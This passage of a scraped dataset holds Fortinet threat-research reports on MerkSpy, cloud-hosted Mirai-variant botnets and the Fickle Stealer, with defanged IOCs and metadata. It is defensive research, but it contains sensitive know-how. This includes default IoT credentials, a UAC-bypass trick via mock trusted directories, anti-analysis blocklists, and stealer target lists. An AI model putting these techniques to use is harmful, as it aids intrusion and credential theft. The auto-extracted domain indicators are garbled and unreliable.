a multi-part form-data submission. The request body is comprised of multiple parts: Based on telemetry from the C2 server at “45[.]89[.]53[.]46,” a significant activity spike began at the end of May, primarily targeting North America and India. The initial phase of the attack leverages a vulnerability in the MSHTML component used by Internet Explorer. Upon exploitation, it initiates the download of a file named “olerender.html,” which contains JavaScript and embedded shellcode. This shellcode decodes the downloaded content to execute an injector responsible for loading the MerkSpy spyware into memory and integrating it with active system processes. MerkSpy is capable of sophisticated surveillance activities, including keystroke logging, screenshot capture, and harvesting Chrome browser login data. By understanding the intricacies of this attack chain, organizations can enhance their readiness and deploy effective defenses against such intrusions. FortiGuard Labs remains vigilant in monitoring these threats and offers ongoing intelligence to safeguard our users. The malware described in this report is detected and blocked by FortiGuard Antivirus as: MSOffice/Agent. AN!tr HTML/Agent. SC!tr Data/Agent. C1FT!tr W64/Injector. SRQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 45[.]89[.]53[.]46 92eb60179d1cf265a9e2094c9a54e025597101b8a78e2a57c19e4681df465e08 95a3380f322f352cf7370c5af47f20b26238d96c3ad57b6bc972776cc294389a 0ffadb53f9624950dea0e07fcffcc31404299230735746ca43d4db05e4d708c6 dd369262074466ce937b52c0acd75abad112e395f353072ae11e3e888ac132a8 569f6cd88806d9db9e92a579dea7a9241352d900f53ff7fe241b0006ba3f0e22 6cdc2355cf07a240e78459dd4dd32e26210e22bf5e4a15ea08a984a5d9241067 microsoft office,spyware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/merkspy-exploiting-cve-2021-40444-to-infiltrate-systems",
      "scraped_at": "2025-07-20T13:47:13.932179",
      "indicators": {
        "ip_address": [],
        "domain": [
          "oogleUpdate",
          "lerender",
          "ocument"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "0ffadb53f9624950dea0e07fcffcc31404299230735746ca43d4db05e4d708c6",
          "569f6cd88806d9db9e92a579dea7a9241352d900f53ff7fe241b0006ba3f0e22",
          "6cdc2355cf07a240e78459dd4dd32e26210e22bf5e4a15ea08a984a5d9241067",
          "92eb60179d1cf265a9e2094c9a54e025597101b8a78e2a57c19e4681df465e08",
          "95a3380f322f352cf7370c5af47f20b26238d96c3ad57b6bc972776cc294389a",
          "dd369262074466ce937b52c0acd75abad112e395f353072ae11e3e888ac132a8"
        ],
        "cve": [
          "CVE-2021-40444"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.5207328833172614
    }
  },
  {
    "id": "Fortinet_21843",
    "source": "Fortinet",
    "title": "The Growing Threat of Malware Concealed Behind Cloud Services",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Linux DistributionsImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Cybersecurity threats are increasingly leveraging cloud services to store, distribute, and establish command and control (C2) servers, such asVCRUMSstored on AWS orSYK Crypterdistributed via DriveHQ. This shift in strategy presents significant challenges for detection and prevention, as cloud services provide scalability, anonymity, and resilience that traditional hosting methods lack. Over the past month, FortiGuard Labs has been monitoring botnets that have adopted this strategy, abusing cloud services to enhance their malicious capabilities. These botnets, such as UNSTABLE and Condi, have been observed leveraging cloud storage and computing services operators to distribute malware payloads and updates to a broad range of devices. Using cloud servers for C2 operations ensures persistent communication with compromised devices, making it harder for defenders to disrupt an attack. We have also observed a threat actor exploiting multiple vulnerabilities to target JAWS webservers, Dasan GPON home routers, Huawei HG532 routers, TP-Link Archer AX21, and Ivanti Connect Secure to amplify their attacks. In this article, we will detail this threat actor's initial attack method and further explore the botnets being used. Initial access by the UNSTABLE Botnet targets the JAWS Webserver RCE vulnerability, CVE-2016-20016, and retrieves the downloader script “jaws” from 45[.]128[.]232[.]15. It includes multiple binary files for 13 architectures executed using the parameter “jaws.exploit.” The UNSTABLE Botnet is a Mirai variant that uses XOR to encode its configuration. It has three main modules: exploitation, scanner, and DDoS attack. The exploitation module targets three vulnerabilities: CVE-2016-20016, CVE-2018-10561/10562, and CVE-2017-17215. The scanner module includes a hard-coded list of usernames and passwords that it uses for brute-force scanning of other endpoints in the network. taZz@23495859 t0talc0ntr0l4! telecomadmin telnetadmin 7ujMko0vizxv 7ujMko0admin ipcam_rt5350 Figure 5: Scanner module and hard-coded username/password The DDoS attack module is a typical list that covers several protocols. The UNSTABLE botnet contains nine methods: attack_tcp_ack, attack_tcp_syn, attack_tcp_legit, attack_tcp_sack2, attack_udp_plain, attack_udp_vse, attack_udp_thread, attack_gre_ip, and attack_method_nudp. The botnets can choose the appropriate method based on commands from its C2 server. FortiGuard Labspreviously disclosedthe Condi DDoS botnet, which continues to exploit CVE-2023-1389 to gain control of devices and execute its malicious activities. The binary file is hosted on “45[.]128[.]232[.]90” for distribution. Once a device is infected, the malware kills off the competition and specific processes. It then sets up a connection to a central Command and Control (C2) server, “trembolone[.]zapto[.]org.” FortiGuard Labs noticed the incident as the payload “ping -c 20 209.141.35.56,” which seemed unusual within such an attack. Since the IP address is neither the attack source nor the destination intranet, we suppose these two IP addresses, 45[.]128[.]232[.]229 and 209[.]141[.]35[.]56, might be controlled by the attacker simultaneously and one of them is a command and control (C2) server. The attack source IP address, “45[.]128[.]232[.]229,” has four files named “msgbox.exe,” “udp,” “udparm,” and “udpmips,” respectively. These are DoS tools for different Linux architectures, except “msgbox.exe,” which pops up a message box with the string “RAT.” The following analysis examines the “udp” file. The tool has an unmistakable usage message, “Usage: %s <IP> <SECONDS> [PORT],” while executing without any arguments. When executing with the necessary “IP” and “SECONDS” arguments, the tool triggers a UDP flooding DoS attack using system-generated random characters. The IP address “209[.]141[.]35[.]56” pinged by the compromised device is exploited by the attack source IP address “45[.]128[.]232[.]229” using the CVE-2023-1389 vulnerability. It was first met with a page that the FBI has seized due to its use as a DDoS service (Figure 12). However, FortiGuard Labs found the IP address also has another route, “hxxp://209[.]141[.]35[.]56/getters/,” which contains 19 malware variants for different Linux architectures. (see Figure 13) microblazebe microblazeel x86_64-core-i7 m68k-coldfire m68k-coldfire.gdb xtensa-lx60 Figure 13: The malware for different Linux architectures We focus on analyzing the file for architecture “x86-i686.” The malware creates a socket and checks whether the C2 server is valid. If not, it terminates the program. If the server is confirmed reachable, the malware sets up a connection with C2 server “45[.]128[.]232[.]229,” which is the exploit CVE-2023-1389 source IP address, executes the “ps” command, and gathers process-related output information. The malware executes the command “ps -eo pid,comm --no-headers” through “/bin/bash” to get all process PIDs (Process IDs) and command names running without a header line. It then leverages the obtained PIDs (Process IDs) to further check the commands of those executing processes using “/proc/<PID>/comm.” Afterward, the malware sends related information to the C2 server. According to our analysis, the attackers seem to have a cloud command and control (C2) server (45[.]128[.]232[.]229) and a network-attached malware storage (209[.]141[.]35[.]56). The attacker first checks to see if the leveraged device can reach the network-attached malware storage to download malware and execute the following attack stages. This malware, which we named “Skibidi,” was spread by the attacker using two different vulnerabilities simultaneously. One is CVE-2023-1389 in TP-Link Archer AX21, which botnets have continuously exploited since it was launched, asdetailed in the reportproduced by FortiGuard Lab. The other is CVE-2024-21887 in Ivanti Connect Secure, which caused a sensation in April 2024. Attackers first download the “Skibidi” malware with a downloader script. It downloads and executes each malware to determine the proper Linux architecture attack. Figure 21: The malware targets Linux architectures The following analysis is based on the malware “skibidi.x86_64.” While executing the malware, it displays the string “youre not skibidi enough.” It then calls the Linux function “ptrace” to handle the process on the victim host. The malware sends signals like a debugger to the sub-program, the malware itself, to fork another process to evade detection. The malware then decodes strings encoded by XOR for the behaviors creating process and popping up execution result string. It calls the system function “prctl,” which manipulates the calling process by naming it with the XOR-encoded strings “-bash” and “x86_64.” Afterward, the malware tries to connect with its C2 server through a socket. Meanwhile, it uses the system call “select” to listen to the events of files the attacker is interested in, such as process events. The malware repeats these steps of listening to events and sends the results back to the server. Cloud services' inherent flexibility and efficiency have unwittingly provided cybercriminals with a new arena for their activities. This shift to cloud-based operations marks a significant evolution in the threat landscape, with malware operators exploiting these platforms' advantages. Organizations must bolster their cloud security defenses as botnets and DDoS tools continue to leverage cloud services. Robust security measures and vigilant monitoring within cloud environments are imperative to combat these sophisticated attacks. Implementing a multi-layered security approach, including regular patching, updates, and network segmentation, is essential to isolate critical assets and mitigate potential breaches. The malware described in this report is detected and blocked by FortiGuard Antivirus as: BASH/Mirai. AEH!tr.dldr ELF/Gafgyt. ST!tr ELF/Mirai. CDB!tr ELF/Mirai. CEA!tr ELF/Mirai. CPD!tr ELF/Mirai. OX!tr ELF/Skibidi. CQC!tr ELF/UDPFlooder.1C8B!tr ELF/UDPFlooder.1EE7!tr ELF/UDPFlooder. E063!tr Linux/Mirai. CPD!tr Linux/Mirai. REAL!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard Web Filtering Service blocks the C2 servers and downloads URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2016-20016: JAWS. DVR. CCTV. Shell. Unauthenticated. Command. Execution CVE-2017-17215: Huawei. HG532. Remote. Code. Execution CVE-2018-10561: Dasan. GPON. Remote. Code. Execution CVE-2018-10562: Dasan. GPON. Remote. Code. Execution CVE-2023-1389: TP-Link. Archer. AX21. Unauthenticated. Command. Injection CVE-2024-21887: Ivanti. Connect. Secure. Policy. Secure. Authentication. Bypass We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 45[.]128[.]232[.]15 45[.]128[.]232[.]90 45[.]128[.]232[.]229 45[.]128[.]232[.]234 hxxp://45[.]128[.]232[.]15 hxxp://45[.]128[.]232[.]90 hxxp://45[.]128[.]232[.]229 hxxp://209[.]141[.]35[.]56/getters hxxp://45[.]128[.]232[.]234 d5e81e9575dcdbbaa038a5b9251531d8beccedc93bd7d250a4bb2389c1615cd6 6226e896850de8c5550b63481b138067582ebf361f7c5448d9d0596062150d89 4c2dcd13685f24800b73856d1f3ec9a2c53c2b5480a9c10b73035a43df26c2e8 31914b317ba6a44a9d3acb99979ec8c163bef8667b0ae41524e335847d70afb0 5fbfc4c8204309e911d22d3b544773f8d4f9ab2edc71f8967bbdcce6cbc834ca 53daa1e4c2f5c11a75989334c2a0227689509606aeda9d7ab11dd200ee6138c6 a9690df4542f28fc4e3b9161b9f8d685d4ce8753bfd9b1f5c8aacd6aa4bef873 fb86bb0863d15ac65a916979052220f755765eb0d5bc4c1c47e34762738d2311 cd05eaa2b01ec1a4880839628d1c6e3bed9045478cacbfb88f14d1937ccf667b c88da56b348f8d89b5ab99a710de7131bdbc2f1dba4bb9809b1b3fd27322630e 83a2608a93b643f68ab3dcfccf8de7b13394cc214a78fa59b6867e47fc56928c 3660fbe90420f60664e68859de918a5c592dd33024f69bebff8bb77ab41b8fca 75b594a20110e487e35ec4590a5211a425119cdf0fea6fcf030ee20cb548b7e5 ef2e57a5992d85ea2bfb5c5645f8b361dcd5c49eede38185a7b99ec00c287550 2e69d9942a4c0d6d0294d038263f2d12f3a5f6aef8d72279b01e025d32addab2 1a8508f62447e5ee624866b571a29cedc369d6ee8182782f32a75dcd58494d8c 305e0eb9b815dddd40d73f4464946a0ec21866b7727e4fe073692bf82bb46936 0092b27bee2df9536e8aff8948a1007ed1eb03f0e12e0348b72a113e7d4cb585 65f2850892365a4d6bafc303ed04379bef3b41a85336e274f9348603105d2f37 c569eb7f33dcec3e6cdcfee7195202813fda6b7bf9ecb786a4a909d6745cbbff 5110f8af13cdd872b904784d2aec75031c663baad01d68b5f05daa950d18ced3 eec122d6480803bcdd2c6906b0ae35bcffaf6bf5117dac8c7b2621f0b98b68ea 9f14cdea1b41ac1c7251e3f2d4186e12d480d108942bc8f1f7bcac133ed88ccc 5a0a8de050cc8ad2f9af41e4018b0317afc39c571f23bc9cfa115c6558205722 eb9ba3171a98dc543cbc599eb6ab9aa3a5a47cc6931afe511fa839c6a5fb889c 1825c787c308d3cb1125d416025af8c8344a158f0a0b3467df6c0c875d2d8800 eb926f93bdd9b38d44d2239b4ec9c1d45762f850bee80cf9556b23372b6f0639 8fb6110b2114e7786b1d4e7f600a08de0a25432417f863d9663d576a3c895e86 dc87ff82199cb60a8bcf59d4f8c0a706bf10051d0c15a911d37d1cda8fcf5f9e 1816c473ba94f4740c0931e118d038ecb0733f8ffb7cbb74dedc7b78952f8318 d4dbd379f914ff5ba40c1aac1be37602e4cde687e47cfd7793cb10192617f4af d034664f627af11bd2a34ba1b228b5a6841309caabfd72a731bbd4724d947e27 4cc2110f89afac1de0c1989d0af07f8879003cac0803660f37cf394a0027db69 bd42e67e6238dfec0b7786797733c54ae1d92fe0e883758dddea779e113b5271 bd42e67e6238dfec0b7786797733c54ae1d92fe0e883758dddea779e113b5271 e758c4428a590519a281344a31f236146c996c784433fbe82eee009dd922516c 3a3581da268d0fdb8c8027e261b682b07b6715c62fbf2c8aca301b7e8dd9d637 6e21e400928f24630339441f6da0f3f1b66860bf480a9f5af20482878b686189 8363ecc977d426f0e922abbeb4f1e8ed06397c0b6951dd75233016d3b5af58c9 e511f5c8fc0bd713dc9b9742e8c682ba66177bb617e9118f84b150cf6ff4a07f ddcb420c4141760feed2fc8c76425b72ab111d271385040c1446f6ab3993c6d7 2b526e5ac01916d74e7aa88770102a8f34d4c57cea7a4e45c501331670635e26 666eed520d2b430e1016eec555c0cd125912f9a8f7590d77c286eff52416fbaf ba4229f5e44c378ae293b58139233a9bfbecbfd22fb51e05f74de38b186a071c c376db6e6f6905113e7beb1f14d8e5a44b8374a959eefd0f5d25ab0f3cbabee2 ae999de92c369e53a3287ab034f2839367b44f7fd82d6ed56a5700c22ed44635 e94b6b99fae4dc8e5b0796c877ed01bf25f77ccab95fb43d24abed00e0f8a15a 8fcb5c4c5306f3e7ffa2a47dedaddc108c77ef8ef48ec0980a0c441333e0a18b 34f653119e418621c1cbfe7cf0614ea62e9a98dc345e4d7408eea96a08d3ac0d a51333460fb711e0b172b6e4893d5bca6b9996f240b450fdaa5cbf14511c9e27 90a43ca83efb2d460b86ff897b1bc657170b6c79c2c804610cdfca8f24adc71e c5b6320925963ca6d5439dca7154c526c3a26500e204b48ff30a50c3a1b875ad e7d87e68265a9a324d76759cca4f613c28c590b36490c8c65ee3d17918e5d3ec 2867b3fd3c840aa9c868a88a5f6d417a09e4158f8209f0450a07eeb7e99ba4c8 botnets,cloud service providers FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/growing-threat-of-malware-concealed-behind-cloud-services",
      "scraped_at": "2025-07-20T13:47:21.872293",
      "indicators": {
        "ip_address": [
          "209.141.35.56"
        ],
        "domain": [
          "sgbox",
          "r",
          "aws",
          "68k-coldfire"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "90a43ca83efb2d460b86ff897b1bc657170b6c79c2c804610cdfca8f24adc71e",
          "8fb6110b2114e7786b1d4e7f600a08de0a25432417f863d9663d576a3c895e86",
          "53daa1e4c2f5c11a75989334c2a0227689509606aeda9d7ab11dd200ee6138c6",
          "a9690df4542f28fc4e3b9161b9f8d685d4ce8753bfd9b1f5c8aacd6aa4bef873",
          "c88da56b348f8d89b5ab99a710de7131bdbc2f1dba4bb9809b1b3fd27322630e",
          "d5e81e9575dcdbbaa038a5b9251531d8beccedc93bd7d250a4bb2389c1615cd6",
          "4cc2110f89afac1de0c1989d0af07f8879003cac0803660f37cf394a0027db69",
          "8fcb5c4c5306f3e7ffa2a47dedaddc108c77ef8ef48ec0980a0c441333e0a18b",
          "1825c787c308d3cb1125d416025af8c8344a158f0a0b3467df6c0c875d2d8800",
          "9f14cdea1b41ac1c7251e3f2d4186e12d480d108942bc8f1f7bcac133ed88ccc",
          "dc87ff82199cb60a8bcf59d4f8c0a706bf10051d0c15a911d37d1cda8fcf5f9e",
          "83a2608a93b643f68ab3dcfccf8de7b13394cc214a78fa59b6867e47fc56928c",
          "c376db6e6f6905113e7beb1f14d8e5a44b8374a959eefd0f5d25ab0f3cbabee2",
          "a51333460fb711e0b172b6e4893d5bca6b9996f240b450fdaa5cbf14511c9e27",
          "8363ecc977d426f0e922abbeb4f1e8ed06397c0b6951dd75233016d3b5af58c9",
          "ba4229f5e44c378ae293b58139233a9bfbecbfd22fb51e05f74de38b186a071c",
          "3a3581da268d0fdb8c8027e261b682b07b6715c62fbf2c8aca301b7e8dd9d637",
          "e758c4428a590519a281344a31f236146c996c784433fbe82eee009dd922516c",
          "cd05eaa2b01ec1a4880839628d1c6e3bed9045478cacbfb88f14d1937ccf667b",
          "5110f8af13cdd872b904784d2aec75031c663baad01d68b5f05daa950d18ced3",
          "6e21e400928f24630339441f6da0f3f1b66860bf480a9f5af20482878b686189",
          "ef2e57a5992d85ea2bfb5c5645f8b361dcd5c49eede38185a7b99ec00c287550",
          "305e0eb9b815dddd40d73f4464946a0ec21866b7727e4fe073692bf82bb46936",
          "6226e896850de8c5550b63481b138067582ebf361f7c5448d9d0596062150d89",
          "1a8508f62447e5ee624866b571a29cedc369d6ee8182782f32a75dcd58494d8c",
          "2e69d9942a4c0d6d0294d038263f2d12f3a5f6aef8d72279b01e025d32addab2",
          "c569eb7f33dcec3e6cdcfee7195202813fda6b7bf9ecb786a4a909d6745cbbff",
          "5a0a8de050cc8ad2f9af41e4018b0317afc39c571f23bc9cfa115c6558205722",
          "e7d87e68265a9a324d76759cca4f613c28c590b36490c8c65ee3d17918e5d3ec",
          "eec122d6480803bcdd2c6906b0ae35bcffaf6bf5117dac8c7b2621f0b98b68ea",
          "c5b6320925963ca6d5439dca7154c526c3a26500e204b48ff30a50c3a1b875ad",
          "4c2dcd13685f24800b73856d1f3ec9a2c53c2b5480a9c10b73035a43df26c2e8",
          "5fbfc4c8204309e911d22d3b544773f8d4f9ab2edc71f8967bbdcce6cbc834ca",
          "e94b6b99fae4dc8e5b0796c877ed01bf25f77ccab95fb43d24abed00e0f8a15a",
          "bd42e67e6238dfec0b7786797733c54ae1d92fe0e883758dddea779e113b5271",
          "3660fbe90420f60664e68859de918a5c592dd33024f69bebff8bb77ab41b8fca",
          "eb9ba3171a98dc543cbc599eb6ab9aa3a5a47cc6931afe511fa839c6a5fb889c",
          "fb86bb0863d15ac65a916979052220f755765eb0d5bc4c1c47e34762738d2311",
          "e511f5c8fc0bd713dc9b9742e8c682ba66177bb617e9118f84b150cf6ff4a07f",
          "31914b317ba6a44a9d3acb99979ec8c163bef8667b0ae41524e335847d70afb0",
          "0092b27bee2df9536e8aff8948a1007ed1eb03f0e12e0348b72a113e7d4cb585",
          "666eed520d2b430e1016eec555c0cd125912f9a8f7590d77c286eff52416fbaf",
          "eb926f93bdd9b38d44d2239b4ec9c1d45762f850bee80cf9556b23372b6f0639",
          "65f2850892365a4d6bafc303ed04379bef3b41a85336e274f9348603105d2f37",
          "d034664f627af11bd2a34ba1b228b5a6841309caabfd72a731bbd4724d947e27",
          "2b526e5ac01916d74e7aa88770102a8f34d4c57cea7a4e45c501331670635e26",
          "d4dbd379f914ff5ba40c1aac1be37602e4cde687e47cfd7793cb10192617f4af",
          "ddcb420c4141760feed2fc8c76425b72ab111d271385040c1446f6ab3993c6d7",
          "2867b3fd3c840aa9c868a88a5f6d417a09e4158f8209f0450a07eeb7e99ba4c8",
          "75b594a20110e487e35ec4590a5211a425119cdf0fea6fcf030ee20cb548b7e5",
          "34f653119e418621c1cbfe7cf0614ea62e9a98dc345e4d7408eea96a08d3ac0d",
          "1816c473ba94f4740c0931e118d038ecb0733f8ffb7cbb74dedc7b78952f8318",
          "ae999de92c369e53a3287ab034f2839367b44f7fd82d6ed56a5700c22ed44635"
        ],
        "cve": [
          "CVE-2024-21887",
          "CVE-2018-10561",
          "CVE-2018-10562",
          "CVE-2023-1389",
          "CVE-2016-20016",
          "CVE-2017-17215"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 1.4926419060967064
    }
  },
  {
    "id": "Fortinet_28124",
    "source": "Fortinet",
    "title": "Fickle Stealer Distributed via Multiple Attack Chain",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High The past few years have seen a significant increase in the number of Rust developers. Rust is a programming language focused on performance and reliability. However, for an attacker, its complicated assembly code is a significant merit. In May 2024, FortiGuard Labs observed a Rust-based stealer. In addition to its intricate code, the stealer is distributed using a variety of strategies and has a flexible way of choosing its target. Because of this ambiguity, we decided to call it Fickle Stealer. This article summarizes the details of this campaign, roughly dividing the attack chain into three stages: Delivery, Preparatory Work, and Packer and Stealer Payload. We are aware of four methods being used to deliver Fickle Stealer: VBA dropper, VBA downloader, link downloader, and executable downloader. For the most part, they download a PowerShell script for preparatory work. The file name is u.ps1 or bypass.ps1—they indicate the same file. In some attack chains, one more file is added between the downloader and u.ps1 The script in the XML file drops Fickle Stealer to the Temp folder and executes it. The second VBA downloader uses forfiles.exe to subvert detections that limit cmd usage. The third downloader uses a trick to indirectly deliver the VBA downloader. In the document, a web browser control that accesses an MSHTML file on the server is embedded in a frame. When the victim enables active content and macro, it reads the MSHTML file and extracts the command from the file. Usually, the WebBrowser. Navigate method is necessary to load a specified URL. However, Word stores the last loaded URL in the document file, and that URL is used if a new one is not provided. In other words, once the URL is loaded, it can be loaded in the next execution even though there is no related macro. Another variant uses this technique to hide the URL (8d3ccfafc39830ee2325170e60a44eca4a24c9c4dd682a84fa60c961a0712316). This section introduces the script files used in this attack. Normal: C:\\Windows \\System32 Fake: C:\\Windows \\System32\\en-US An MSC file, hosted in Microsoft Management Console (MMC), manages the hardware, software, and network components and requires admin rights. Snap-ins provide the interface to the management task and access to the required program and data. The fake WmiMgmt.msc abuses a Shockwave Flash Object from ActiveX control, which opens a web browser by default. The URL for the web browser is set to localhost, and u.ps1 creates HttpListener, which shows a web page when WmiMgmt.msc is executed. The web page contains a script that configures exclusions for Fickle Stealer and then downloads it to be executed. The file path uses a technique called the Mock Trusted Directories Method. When converting a string during an evaluation request process, the trailing space after “Windows” is removed. As a result, the WmiMgmt.msc will be treated as executed from a trusted path. Furthermore, MMC searches the MSC file for local languages. If not found, it tries to find one for en-US, so when Fickle Stealer executes WmiMgmt.msc’s copy, the fake WmiMgmt.msc is executed instead, with elevated authentication and no UAC prompt pops up. Besides the message, tgmes.ps1 sends victim information, including country, city, IP address, OS version, computer name, and user name to the Telegram bot. Fickle Stealer is protected by a packer disguised as a legal executable. It seems that the attacker made the packer by replacing some code of a legal executable with the packer’s code and changing a function called in the initialize routine into the packer’s function. This can frustrate the static analysis. Mimicking various applications makes it difficult to detect the malware using certain detection rules. For example, there is a variant (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53) whose__cinitfunction in the initialize routine is modified into the packer’s function. In this case, the malicious code is executed before the WinMain function, which is usually the user-provided entry point for a C/C++ GUI application. As a result, people following typical analysis rules may overlook the malicious code. The packer only allocates memory to write the decrypted payload data and then executes it in memory. Initially, Fickle Stealer creates a mutex to prevent a race condition. It then performs a series of anti-analysis checks and exits the process while it is being analyzed. Generally, it shows a fake error message before terminating the process. Below are the anti-analysis techniques used: Query string:SELECT Name FROM Win32_Process Blacklist:tcpview, wireshark, fiddler, procexp, autoit, df5serv, OllyDbg, x64dbg, x32dbg, WinDbg, fakenet32, fakenet64, ProcessHacker, autorunsc, filemon, procmon, regmon, idaq, idaq64, ImmunityDebugger, dumpcap, HookExplorer, ImportREC, PETools, LordPE, SysInspector, proc_analyzer, sysAnalyzer, sniff_hit, joeboxcontrol, joeboxserver, ResourceHacker, Fidder, httpdebugger, PE-bear, die, sample, malware, virus, sandbox, maltest, test, and virustest Blacklist:SbieDll, SxIn, Sf2, snxhk, cmdvrt32 Query string:SELECT * FROM Win32_PortConnectorSELECT * FROM CIM_MemorySELECT * FROM CIM_PhysicalConnectorSELECT * FROM CIM_SlotSELECT * FROM Win32_SMBIOSMemorySELECT * FROM Win32_MemoryArraySELECT * FROM Win32_MemoryDeviceSELECT * FROM Win32_PhysicalMemorySELECT * FROM Win32_CacheMemory Blacklist: (Empty) Query string:SELECT UUID FROM Win32_ComputerSystemProduct Blacklist:7AB5C494-39F5-4941-9163-47F54D6D501603DE0294-0480-05DE-1A06-35070008000911111111-2222-3333-4444-5555555555556F3CA5EC-BEC9-4A4D-8274-11168F640058ADEEEE9E-EF0A-6B84-B14B-B83A54AFC5484C4C4544-0050-3710-8058-CAC04F59344A00000000-0000-0000-0000-AC1F6BD0497200000000-0000-0000-0000-0000000000005BD24D56-789F-8468-7CDC-CAA7222CC12149434D53-0200-9065-2500-65902500E43949434D53-0200-9036-2500-36902500F022777D84B3-88D1-451C-93E4-D235177420A749434D53-0200-9036-2500-369025000C65B1112042-52E8-E25B-3655-6A4F54155DBF00000000-0000-0000-0000-AC1F6BD048FEEB16924B-FB6D-4FA1-8666-17B91F62FB37A15A930C-8251-9645-AF63-E45AD728C20C67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3C7D23342-A5D4-68A1-59AC-CF40F735B36363203342-0EB0-AA1A-4DF5-3FB37DBB067044B94D56-65AB-DC02-86A0-98143A7423BF6608003F-ECE4-494E-B07E-1C4615D1D93CD9142042-8F51-5EFF-D5F8-EE9AE3D1602A49434D53-0200-9036-2500-369025003AF08B4E8278-525C-7343-B825-280AEBCD3BCB4D4DDC94-E06C-44F4-95FE-33A1ADA5AC2779AF5279-16CF-4094-9758-F88A616D81B4FF577B79-782E-0A4D-8568-B35A9B7EB76B Blacklist:Billy, george, Abby, Darrel Jones, John, John Zalinsk, John Doe, SHCtAGa3rm, UV0U6479boGY, 8wjXNBz, WALKER, oxYT3lZggZMK, t3wObOwwaW, uh6PN, sMdVVcp, 06AAy3, mLfaNLLP, JPQlavKFb0Lt0, 7HV8BUt5BIsCZ, aFgxGd9fq4Iv8, Frank, Anna, wdagutilityaccount, WDAGUtilityAccount, hal9th, virus, malware, sandbox, sample, currentuser, emily, hapubws, hong lee, jaakw.q, it-admin, johnson, miller, milozs, microsoft, sand box, and maltest. Next, it creates a new folder in the Temp folder with a random name, drops its copy to the new folder, and executes the copy. The currently running stealer will be terminated, and the copy will finish the remaining work to communicate with the server and send stolen data to the server. If the environment check is passed, Fickle Stealer sends victim information to the server. The server sends a list of target applications and keywords as a response. Fickle Stealer sends all files in folders according to the list. The stolen data is stored in a specific JSON format that has three key-value pairs: \"name\": \"RB_{Computer name}\",\"title\": {File name},\"body\": {File content} In this sample, its name contains a string RB and the name of the victim’s computer. In version 1.5.7 (a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53), the string “RB” is changed to “Hold.” The title indicates the data it grabs. It usually contains a tag followed by a file path. The body is base64-encoded file content. After being compressed with the Deflate algorithm, the JSON-formatted data is sent to the server. There are some exceptions. For example, the first packet sent to the server contains the following items, and the title is System.txt. user name, user domain, DNS host name, NetBIOS name, screen resolution, OS version, language, host name, ip address and hardware information: CPU, GPU, Antivirus software, installed application and currently running process The server's response is also in JSON format and has three key-value pairs: status, k, and c. The target list, encrypted using an RC4 algorithm and then base64 encoded, is stored in c. The decryption key for RC4 is stored in k, as the following image shows. There are four kinds of targets: crypto wallets, plugins, file extensions, and partial paths. Below are the targets specified by the server and the way the data is processed: Sends files in specified folders. The title of data to send has a “wallet::” tag. AtomicWallet, Exodus, JaxxWallet, Electrum, ByteCoin, Ethereum, Guarda, Coinomi, Armory, ZCash Sends files in specified folders. The title of data to send has a “plugin___” tag. Authenticator, EOSAuthenticator, Bitwarden, KeePassXC, Dashlane, 1Password, NordPass, Keeper, RoboForm, LastPass, BrowserPass, MYKI, Splikity, CommonKey, ZohoVault, NortonPasswordManager, AviraPasswordManager, TrezorPasswordManager, MetaMask, TronLink, BinanceChain, Coin98, iWallet, Wombat, MEWCX, NeoLine, TerraStation, Keplr, Sollet, ICONex, KHC, TezBox, Byone, OneKey, DAppPlay, BitClip, SteemKeychain, NashExtension, HyconLiteClient, ZilPay, LeafWallet, CyanoWallet, CyanoWalletPro, NaboxWallet, PolymeshWallet, NiftyWallet, LiqualityWallet, MathWallet, CoinbaseWallet, CloverWallet, Yoroi, Guarda, EQUALWallet, BitAppWallet, AuroWallet, SaturnWallet, RoninWallet, Exodus, MaiarDeFiWallet, Nami, Eternl, UniSatWallet File extension Searches files with the following extensions in %USERPROFILE% and the sub-folder. The title of data to send has a “grabg::” tag. .txt, .kdbx, .pdf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .odp, wallet.dat Partial path Concatenates %APPDATA% and the following strings and 